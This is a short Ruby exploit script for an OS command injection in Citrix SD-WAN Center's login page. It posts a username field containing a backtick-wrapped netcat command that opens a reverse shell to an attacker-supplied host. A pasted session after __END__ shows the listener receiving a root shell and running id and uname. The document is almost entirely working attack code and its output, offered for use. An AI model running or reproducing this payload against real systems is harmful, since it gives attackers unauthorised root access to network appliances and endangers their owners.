#!/usr/bin/env ruby 
# Tested against ctx-sdwc-10.1.2.13-vmware.ova

require 'rex'

host  = ARGV[0]
lhost = ARGV[1]

def usage
 puts "[*] Citrix SD-WAN Center OS Command Injection."
 puts "[*] #{$0} <host> <lhost>"
 exit
end

usage if ARGV.size < 2

begin

sock = Rex::Proto::Http::Client.new(host, port = "443", context = {}, ssl = true)


data = "_method=POST&data[User][username]=`nc #{lhost} 65535 -e /bin/sh`&data[User][password]=my_password&data[User][secPassword]=......"

req = sock.request_cgi(
	{
		'uri'   => "/login",
		'version' => '1.0',
		'method' => 'POST',
                'data' => data,
	})

sock.send_request(req)
rescue => e
puts "[!] #{e.to_s}"
end
__END__
$ nc -v -l 65535
Listening on [0.0.0.0] (family 0, port 65535)
Connection from [192.168.1.154] port 65535 [tcp/*] accepted (family 2, sport 36048)
id   
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux SD-WANCenter 3.16.7-nmsv1 #1 SMP PREEMPT Mon Nov 5 10:00:50 UTC 2018 x86_64 GNU/Linux
